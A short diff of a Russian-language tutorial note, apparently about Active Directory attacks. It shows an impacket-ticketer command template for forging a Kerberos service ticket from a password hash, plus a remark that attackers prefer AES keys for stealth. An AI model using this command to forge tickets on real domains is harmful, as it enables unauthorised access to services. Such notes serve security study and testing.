@@ -87,7 +87,7 @@ AES-256 шифртекст: *48928a8b4bfc4f70dea2aa7640041d8a7de044870110374dbc8
 `impacket-ticketer -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>`
 ![](../../../Attachments/st1.png)
 
-*P.S. для большей скрытности злоумышленники, обычно, используют aes хэш (флаг `-aes`)*
+*P.S. для большей скрытности злоумышленники, обычно, используют aes (флаг `-aes`)*
 
 В результате, получили билет, который теперь необходимо заэкспортить:
 
